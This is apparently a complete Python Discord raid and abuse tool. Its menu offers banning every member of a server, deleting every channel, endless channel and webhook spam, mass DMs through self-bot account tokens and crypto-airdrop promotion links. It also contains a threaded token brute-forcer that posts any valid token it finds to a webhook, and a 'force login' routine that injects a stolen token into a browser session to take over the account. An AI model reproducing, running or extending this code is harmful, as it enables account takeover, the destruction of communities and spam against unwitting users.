import sys
import discord
import shutil
from colorama import init, Fore, Back
import itertools
import requests
import time
import aiohttp
import random
import asyncio
import ctypes
import click
import os
import random
import string
import base64
import threading
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from time import sleep
init(autoreset=True)




TOKEN_TYPE_BOT = 1
TOKEN_TYPE_ACCOUNT = 2


def token_type_to_str(token_type):
    return "Bot" if token_type == TOKEN_TYPE_BOT else "Bearer"

rainbow_colors = [
    Fore.LIGHTCYAN_EX, Fore.LIGHTGREEN_EX,
    Fore.LIGHTCYAN_EX, Fore.LIGHTGREEN_EX,
    Fore.LIGHTCYAN_EX, Fore.LIGHTGREEN_EX,
    Fore.LIGHTCYAN_EX, Fore.LIGHTGREEN_EX,
    Fore.LIGHTCYAN_EX, Fore.LIGHTGREEN_EX,
    Fore.LIGHTCYAN_EX, Fore.LIGHTGREEN_EX
]

BOT_TOKEN = ''
ACCOUNT_TOKEN = ''
GUILD_ID = ''
TOKEN_TYPE = None
TARGET_VERSION = 0


def get_proxy_type():
    h = "http"
    if "socks5" in h:
        h = "socks5"
    return h

heads = [
    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
    },

    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1"
    },

    {
       "Content-Type": "application/json",
       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
    }]

def get_channels(token, guild_id):
    headers = {
        'Authorization': f'{token_type_to_str(TOKEN_TYPE)} {token}',
    }

    response = requests.get(f'https://discord.com/api/v10/guilds/{guild_id}/channels', headers=headers)

    if response.status_code == 200:
        return response.json()
    else:
        print(f"Failed to fetch channels: {response.text}")
        return []
    
def getheaders(token=None):
    headers = random.choice(heads)
    if token:
        headers.update({"Authorization": token})
    return headers

async def main_bot_message(token, guild_id, message):
    headers = {
        'Authorization': f'{token_type_to_str(TOKEN_TYPE)} {token}',
        'Content-Type': 'application/json',
    }

    data = {
        'content': message,
    }

    async with aiohttp.ClientSession() as session:
        async with session.get(f'https://discord.com/api/v10/guilds/{guild_id}/members', headers=headers) as response:
            if response.status == 200:
                members = await response.json()
                for member in members:
                    if 'user' in member:
                        user_id = member['user']['id']
                        async with session.post(f'https://discord.com/api/v10/users/{user_id}/messages', headers=headers, json=data) as message_response:
                            if message_response.status == 200:
                                print(f"Message sent to user {user_id}: {message}")
                            else:
                                print(f"Failed to send message to a user D:")
            else:
                print(f"Failed to fetch members: {await response.text()}")
def validateToken(token):
    headers = {
        'Authorization': token,
    }

    response = requests.get('https://discord.com/api/v10/users/@me', headers=headers)

    if response.status_code == 200:
        print("Token is valid.")
        return True
    else:
        print("Token is invalid")
        return False
    
def massdmconfig(token, channel_id, content):
    try:
        requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages',
                      headers={'Authorization': token},
                      data={"content": content})
        print(f"{Fore.RED}Messaged {Fore.BLUE}ID: {channel_id}{Fore.RESET}")
        time.sleep(1)
    except Exception as e:
        print(f"FREAK: {e}")

def massdm():
    token = input(f"{Fore.RED} <~> Token: {Fore.BLUE}")

    if not validateToken(token):
        print("Invalid token")
        return

    server_count = 1

    while True:
        print(f"{Fore.RED}{server_count}st server:")
        target_server_id = input(f"{Fore.RED} target server ID: {Fore.BLUE}")
        
        channels_response = requests.get(f"https://discord.com/api/v9/guilds/{target_server_id}/channels", headers={'Authorization': token})
        if channels_response.status_code != 200:
            print(f"Failed to fetch channels for server ID {target_server_id}.")
            continue
        
        channels_data = channels_response.json()
        print(f"Channels of this server to target:")
        for channel in channels_data:
            print(f"- {channel['name']} (ID: {channel['id']})")

        message = input(f"{Fore.RED} Message to send to every friend in this server: {Fore.BLUE}")

        more_servers = input("Any more servers? (Y/N): ").strip().lower()
        if more_servers != "y":
            break

        server_count += 1

    print("Operation completed!")


def massad():
    token = input(f"{Fore.RED} <~> Token: {Fore.BLUE}")

    if not validateToken(token):
        print("Invalid token")
        return

    servers = []

    while True:
        choice = int(input(f"{Fore.RED} Select message (1-4): {Fore.BLUE}"))

        if choice == 1:
            message = ("MEME FARMING\n"
                       "1. COMPLETE QUESTS\n"
                       "2. COLLECT MEMEPOINTS\n"
                       "3. PROFIT! HARVEST!\n"
                       "https://memefarming.eu//")
        elif choice == 2:
            message = ("https://fofar.eu/\n"
                       "https://medium.com/@Forfarairdrop/fofar-airdrop-ab4ec7d7c7f1")
        elif choice == 3:
            message = ("n\n"
                       "n\n"
                       "n\n"
                       "n\n"
                       "n")
        elif choice == 4:
            message = input(f"{Fore.RED} Enter your custom message: {Fore.BLUE}")
        else:
            print("Invalid choice")
            continue

        server_count = 1

        while True:
            print(f"{Fore.RED}{server_count}st server:")
            target_server_id = input(f"{Fore.RED} Server ID: {Fore.BLUE}")
            target_channel_id = input(f"{Fore.RED} Channel ID: {Fore.BLUE}")

            massdmconfig(token, target_channel_id, message)
            servers.append((target_server_id, target_channel_id))

            more_servers = input("Anymore servers? (Y/N): ").strip().lower()
            if more_servers != "y":
                break

            server_count += 1

        loop = input("Do you want to loop these messages? (Y/N): ").strip().lower()
        if loop != "y":
            break

        delay_time = int(input("Enter the delay time between sending messages (in seconds): "))
        loop_count = int(input("Enter the number of times to loop: "))
        
        for _ in range(loop_count):
            for server_id, channel_id in servers:
                massdmconfig(token, channel_id, message)
            time.sleep(delay_time)

    print("Exiting...")


def chat(token, channel_id, message):
    headers = {
        'Authorization': f'{token_type_to_str(TOKEN_TYPE)} {token}',
        'Content-Type': 'application/json',
    }

    data = {
        'content': message,
    }

    response = requests.post(f'https://discord.com/api/v10/channels/{channel_id}/messages', headers=headers, json=data)

    if response.status_code == 200:
        print(f"Message sent to a channel: {message}")
    else:
        print(f"Failed to send message to a channel")

class Edge_Installer(object):
    installed = False
    target_version = None
    DL_BASE = "https://msedgedriver.azureedge.net/"

    def __init__(self, executable_path=None, target_version=None, *args, **kwargs):
        self.platform = sys.platform

        if TARGET_VERSION:
            self.target_version = TARGET_VERSION

        if target_version:
            self.target_version = target_version

        if not self.target_version:
            self.target_version = self.get_release_version_number().version[0]

        self._base = base_ = "edgedriver{}"

        exe_name = self._base
        if self.platform in ("win32",):
            exe_name = base_.format(".exe")
        if self.platform in ("linux",):
            self.platform += "64"
            exe_name = exe_name.format("")
        if self.platform in ("darwin",):
            self.platform = "mac64"
            exe_name = exe_name.format("")
        self.executable_path = executable_path or exe_name
        self._exe_name = exe_name

        if not os.path.exists(self.executable_path):
            self.fetch_edgedriver()
            if not self.__class__.installed:
                if self.patch_binary():
                    self.__class__.installed = True



def get_driver():
    drivers = ["msedgedriver.exe"]

    print(f"\n{Fore.BLUE} <!> Checking Driver. . .")
    sleep(0.5)

    for driver in drivers:
        if os.path.exists(os.getcwd() + os.sep + driver):
            print(f" <!>{Fore.BLUE}{driver} already exists, continuing. . .{Fore.RESET}")
            sleep(0.5)
            return driver
    else:
        print(f"{Fore.RED} <!> Driver not found! Installing it for you")
        if os.path.exists(os.getenv('localappdata') + '\\Microsoft\\Edge'):
            Edge_Installer()
            print(f"{Fore.GREEN} <*> msedgedriver.exe Installed!{Fore.RESET}")
            return "msedgedriver.exe"
        else:
            print(f'<!> No compatible driver found. . . Proceeding with msedgedriver')
            Edge_Installer()
            print(f"{Fore.GREEN} <!> trying to install msedgedriver.exe{Fore.RESET}")
            return "msedgedriver.exe"
        
def create_channels(token, guild_id, channel_names, amount):
    headers = {
        'Authorization': f'{token_type_to_str(TOKEN_TYPE)} {token}',
        'Content-Type': 'application/json',
    }

    for i in range(amount):
        for channel_name in channel_names:
            data = {
                'name': channel_name,
                'type': 0,
            }

            response = requests.post(f'https://discord.com/api/v10/guilds/{guild_id}/channels', headers=headers, json=data)

            if response.status_code == 201:
                print(f"Channel created")
            else:
                print(f"Failed to create channel")

def ban_all_members(token, guild_id):
    headers = {
        'Authorization': f'Bot {token}',
    }

    cursor = None
    default_ban_reason = 'Join discord.gg/FGH YOU noobie'  # Default ban reason

    while True:
        params = {
            'limit': 1000,
            'after': cursor,
        }

        response = requests.get(f'https://discord.com/api/v10/guilds/{guild_id}/members', headers=headers, params=params)

        if response.status_code == 200:
            members = response.json()

            if not members:
                break

            for member in members:
                if 'user' in member:
                    user_id = member['user']['id']
                    data = {
                        'reason': default_ban_reason  # Use the default ban reason
                    }
                    response = requests.put(f'https://discord.com/api/v10/guilds/{guild_id}/bans/{user_id}', headers=headers, json=data)
                    if response.status_code == 204:
                        print(f"Banned user: {user_id} for reason: {default_ban_reason}")
                    else:
                        print(f"Failed to ban user {user_id}: {response.text}")

            cursor = members[-1]['user']['id']

        else:
            print(f"Failed to fetch members: {response.text}")
            break

def get_friends(token):
    headers = {
        'Authorization': f'{token_type_to_str(TOKEN_TYPE)} {token}',
    }

    response = requests.get('https://discord.com/api/v10/users/@me/relationships', headers=headers)

    if response.status_code == 200:
        friends = response.json()
        return [friend for friend in friends if friend['type'] == 1]
    else:
        print(f"Failed to fetch friends: {response.text}")
        return []

def dm_friend(token, friend_id, message):
    headers = {
        'Authorization': f'{token_type_to_str(TOKEN_TYPE)} {token}',
        'Content-Type': 'application/json',
    }

    data = {
        'content': message,
    }

    response = requests.post(f'https://discord.com/api/v10/users/{friend_id}/messages', headers=headers, json=data)
    if response.status_code == 200:
        print(f"Message sent to friend {friend_id}: {message}")
    else:
        print(f"Failed to send message to a friend")

def delete_all_channels(token, guild_id):
    headers = {
        'Authorization': f'{token_type_to_str(TOKEN_TYPE)} {token}',
    }

    channels = get_channels(token, guild_id)

    for channel in channels:
        channel_id = channel['id']
        response = requests.delete(f'https://discord.com/api/v10/channels/{channel_id}', headers=headers)

        if response.status_code == 204:
            print(f"Deleted a channel")
        else:
            print(f"Failed to delete an channel")

async def send_message_to_webhook(session, webhook_url, message, webhook_number):
    async with session.post(webhook_url, json={"content": f"{message} - Webhook {webhook_number}"}) as response:
        if response.status == 204:
            print(f"Message sent to webhook {webhook_number}: {message}")
        else:
            print(f"error with webhook ")

async def chat_with_webhooks(webhooks, message):
    while True:
        if webhooks:
            async with aiohttp.ClientSession() as session:
                tasks = []

                for index, webhook in enumerate(webhooks, start=1):
                    task = send_message_to_webhook(session, webhook, message, index)
                    tasks.append(task)

                await asyncio.gather(*tasks)
        else:
            print("No webhooks were made now chatting without webhooks.")
        
      
        await asyncio.sleep(0)  

def mass_dm_friends():
    windowSize = 'mode 85,20'
    os.system(windowSize)
    ctypes.windll.kernel32.SetConsoleTitleW("FGH")
    click.clear()
    client = discord.Client()

    global auth
    auth = input('Enter your account token: ')  # Use an account token here

    try:
        ctypes.windll.kernel32.SetConsoleTitleW(f"{os.getlogin()} | Token: {auth}")
    except:
        ctypes.windll.kernel32.SetConsoleTitleW(f"FGH's Client | Token: {auth}")

    message = input('FGH@message: ')
    click.clear()

    @client.event
    async def on_ready():
        print(f'Logged in as {client.user.name}')
        for user in client.user.friends:
            try:
                await user.send(message)
            except:
                pass

    client.run(auth, bot=False)


def create_webhooks_for_channels(token, guild_id):
    headers = {
        'Authorization': f'{token_type_to_str(TOKEN_TYPE)} {token}',
        'Content-Type': 'application/json',
    }

    response = requests.get(f'https://discord.com/api/v10/guilds/{guild_id}/channels', headers=headers)

    if response.status_code == 200:
        channels = response.json()
        webhooks = []

        for channel in channels:
            if channel['type'] == 0:
                existing_webhooks = get_existing_webhooks(token, channel['id'])

                if existing_webhooks:
                    webhook_url = existing_webhooks[0]
                    print(f"existing webhook found now changing to a channel")
                else:
                    webhook_data = {
                        'name': 'Webhook',
                    }
                    webhook_response = requests.post(f'https://discord.com/api/v10/channels/{channel["id"]}/webhooks', headers=headers, json=webhook_data)

                    if webhook_response.status_code == 200:
                        webhook = webhook_response.json()
                        webhook_url = webhook['url']
                        print(f"Webhook made for a channel")
                    else:
                        print(f"Failed to create webhook for a channel")

                webhooks.append(webhook_url)

                time.sleep(0.2)
        return webhooks
    else:
        print(f"Failed to get a channel")
        return []

def get_existing_webhooks(token, channel_id):
    headers = {
        'Authorization': f'{token_type_to_str(TOKEN_TYPE)} {token}',
    }

    response = requests.get(f'https://discord.com/api/v10/channels/{channel_id}/webhooks', headers=headers)

    if response.status_code == 200:
        webhooks = response.json()
        return [webhook['url'] for webhook in webhooks]
    else:
        print(f"Failed Webhook")
        return []
def token_bruteforce():

    id_to_token = base64.b64encode((input("User ID: ")).encode("ascii"))
    id_to_token = str(id_to_token)[2:-1]

    DISCORD_WEBHOOK_URL = input(f'{Fore.GREEN} Webhook Url: {Fore.BLACK}')

    def bruteforce():
        while True:
            token = id_to_token + '.' + ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + '.' + ''.join(
                random.choices(string.ascii_letters + string.digits, k=25))
            login = requests.get('https://discord.com/api/v9/auth/login', headers=getheaders(token))
            try:
                if login.status_code == 200:
                    print(f'{Fore.BLUE} Valid' + ' ' + token)
                    send_to_discord(token)
                else:
                    print(f'{Fore.GREEN} Invalid' + f'{Fore.BLACK} ' + token)
            except Exception as e:
                print('Error:', e)
            finally:
                print('')

    def send_to_discord(token):
        data = {
            "content": token,
        }
        try:
            response = requests.post(DISCORD_WEBHOOK_URL, json=data)
            response.raise_for_status()
        except requests.exceptions.RequestException as e:
            print('<!> Error sending to Discord:', e)

    def start_threads():
        for _ in range(25):
            threading.Thread(target=bruteforce).start()

    start_threads()
def TokenLoging(token):
    j = requests.get("https://discord.com/api/v10/users/@me", headers=getheaders(token)).json()
    user = j["username"] + "#" + str(j["discriminator"])
    script = """
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"%s"`
            location.reload();
        """ % (token)
    type_ = get_driver()

    if  type_ == "msedgedriver.exe":
        opts = webdriver.EdgeOptions()
        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
        opts.add_experimental_option("detach", True)
        driver = webdriver.Edge(options=opts)
    else:
        print(f'{Fore.RED} <!> Couldn\'t find a driver to automate the process of logging in to {user}')
        sleep(3)
        print(f"{Fore.BLUE} <*> Paste this script into the console of a browser:\n\n{Back.RED}{script}\n{Back.RESET}")

    print(f"{Fore.BLUE} <*> Logging into {Fore.BLUE}{user}")
    driver.get("https://discordapp.com/login")
    driver.execute_script(script)

def tokenlogin():
    token = input(f' <~> {Fore.RED}Token: {Fore.RED}')
    validateToken(token)
    TokenLoging(token)

def main():
    global BOT_TOKEN, ACCOUNT_TOKEN, GUILD_ID, TOKEN_TYPE  

    title = f"""
{Fore.GREEN}╔═════════════════════════════════════╗
{Fore.BLUE}║   ███████╗░░░░██████╗░░░░██╗░░██╗   ║
{Fore.GREEN}║   ██╔════╝░░░██╔════╝░░░░██║░░██║   ║
{Fore.BLUE}║   █████╗░░░░░██║░░██╗░░░░███████║   ║
{Fore.GREEN}║   ██╔══╝░░░░░██║░░╚██╗░░░██╔══██║   ║
{Fore.BLUE}║   ██║░░░░░██╗╚██████╔╝██╗██║░░██║   ║ 
{Fore.GREEN}║   ╚═╝░░░░░╚═╝░╚═════╝░╚═╝╚═╝░░╚═╝   ║  
{Fore.BLUE}╚═══                               ═══╝
    """

    print(title)

    while not TOKEN_TYPE:
        print("\nSelect the token type:")
        print(f"{Fore.RED}[1] Bot Token (Discord API)")
        print(f"{Fore.BLUE}soon probably gonna be tiktok")
  
        token_option = input(f"""{Fore.GREEN}   \n║ Enter the option                               
╚════════════════ 1 / 2:""")

        if token_option == "1":
            TOKEN_TYPE = TOKEN_TYPE_BOT
        elif token_option == "2":
            TOKEN_TYPE = TOKEN_TYPE_ACCOUNT
        else:
            print("Invalid option selected.")

    if TOKEN_TYPE == TOKEN_TYPE_BOT:
        while True:
            print("\nBot Options:")
            print(f"{Fore.BLUE} [!] Quit   ")
            print(f"{Fore.RED}╔═══ NUKE                          ═══╗ ╔═══ MISC                          ═══╗ ╔═══WEBHOOKS                       ═══╗ ")
            print(f"{Fore.BLUE}║   [1] Mass Message (BEST ONE)       ║ ║    [6] brute force                  ║ ║                                     ║")
            print(f"{Fore.RED}║   [2] Create Channels               ║ ║    [7] mass dm                      ║ ║                                     ║")
            print(f"{Fore.BLUE}║   [3] Ban everyone                  ║ ║    [8] force login                  ║ ║                                     ║")
            print(f"{Fore.RED}║   [4] Dm whole server               ║ ║     [9] massad                      ║ ║                                     ║")
            print(f"{Fore.BLUE}║   [5] Delete All Channels           ║ ║                                     ║ ║                                     ║")
            print(f"{Fore.RED}║                                     ║ ║                                     ║ ║                                     ║")
            print(f"{Fore.BLUE}║                                     ║ ║                                     ║ ║                                     ║")
            print(f"{Fore.RED}║                                     ║ ║                                     ║ ║                                     ║")
            print(f"{Fore.BLUE}║                                     ║ ║                                     ║ ║                                     ║")
            print(f"{Fore.RED}║                                     ║ ║                                     ║ ║                                     ║")
            print(f"{Fore.BLUE}╚═══                               ═══╝ ╚═══                               ═══╝ ╚═══                               ═══╝")

            option = input(
            f"""{Fore.RED}║ Select an option
╚══════════════════⪢ :""")

            if option == "1":
                while not BOT_TOKEN:
                    BOT_TOKEN = input(f"{Fore.BLUE}Enter your bot token: ")

                while not GUILD_ID:
                    GUILD_ID = input(f"{Fore.BLUE}Enter the server (guild) ID: ")

                use_webhooks_input = input(f"{Fore.RED}Enable webhooks? (Y/N): ").strip().lower()
                use_webhooks = use_webhooks_input == "y"

                message = input(f"{Fore.BLUE}Message: ")
                if message:
                    if use_webhooks:
                        webhooks = create_webhooks_for_channels(BOT_TOKEN, GUILD_ID)
                        if webhooks:
                            asyncio.run(chat_with_webhooks(webhooks, message))
                        else:
                            print(f"{Fore.RED}No webhooks were created chatting without webhooks.")
                    else:
                        try:
                            while True:
                                channels = get_channels(BOT_TOKEN, GUILD_ID)
                                for channel in channels:
                                    if channel['type'] == 0:  
                                        chat(BOT_TOKEN, channel['id'], message)
                                time.sleep(1)  
                        except KeyboardInterrupt:
                            print("\nChat stopped.")
                else:
                    print("enter a chat message.")

            elif option == "2":
                while not BOT_TOKEN:
                    BOT_TOKEN = input("bot token: ")

                while not GUILD_ID:
                    GUILD_ID = input("Enter the server (guild) ID: ")

                channel_names = input("Enter the channel names seperate by comma: ").split(',')
                amount = int(input("amout of channels: "))

                if channel_names and amount > 0:
                    create_channels(BOT_TOKEN, GUILD_ID, channel_names, amount)
                else:
                    print("enter a valid string stupid no namer.")

            elif option == "3":
                while not BOT_TOKEN:
                    BOT_TOKEN = input("bot token: ")

                while not GUILD_ID:
                    GUILD_ID = input("server (guild) ID: ")

                confirm = input("Are you sure that this is the right server? (Y/N): ").strip().lower()
                if confirm == "y":
                    ban_all_members(BOT_TOKEN, GUILD_ID)
                else:
                    print("Banning canceled.")

            elif option == "4":
                while not BOT_TOKEN:
                    BOT_TOKEN = input("Enter your bot token: ")

                while not GUILD_ID:
                    GUILD_ID = input("Enter the server (guild) ID: ")

                message = input("custom message: ")
                if message:
                    try:
                        intents = discord.Intents.default()
                        intents.typing = True
                        intents.presences = True
                        intents.members = True

                        client = discord.Client(intents=intents)

                        @client.event
                        async def on_ready():
                            print(f'Logged in as {client.user.name}')
                            try:
                                guild = client.get_guild(int(GUILD_ID))
                                if guild:
                                    print(f'Found guild: {guild.name} (ID: {guild.id})')
                                    
                                    for _ in range(3): 
                                        for member in guild.members:
                                            if member.id != client.user.id:
                                                try:
                                                    print(f'Sending message to > {member.name}')
                                                    await member.send(message)
                                                    print(f'Done sending to > {member.name}')
                                                except discord.Forbidden:
                                                    print(f'Failed to send message to {member.name} (DMs may be disabled for the user or your bot is rate limited)')
                                                except Exception as e:
                                                    print(f'Error sending message to {member.name}#{member.discriminator}: {e}')
                                        await asyncio.sleep(6)  # 
                                    await client.close()
                                else:
                                    print(f'Guild ID {GUILD_ID} not found')
                            except Exception as e:
                                print(f'Error: {e}')


                        @client.event
                        async def on_disconnect():
                            print("Bot disconnected.")
                        
                        client.run(BOT_TOKEN)
                    except KeyboardInterrupt:
                        print("\nSending messages stopped.")
                else:
                    print("enter a message to send.")


            elif option == "5":
                while not BOT_TOKEN:
                    BOT_TOKEN = input("bot token: ")

                while not GUILD_ID:
                    GUILD_ID = input("Enter server (guild) ID: ")

                confirm = input("Sure this is the right server? (Y/N): ").strip().lower()
                if confirm == "y":
                    delete_all_channels(BOT_TOKEN, GUILD_ID)
                else:
                    print("Channel deletion off.")

            elif option == "!":
                print("fuck you")
                break
            elif option == "6":
                token_bruteforce()
            elif option == "7":
                 massdm()
            elif option == "8":
                tokenlogin()
            elif option == "9":
                massad()
            else:
                print("Invalid")

if __name__ == "__main__":
    main()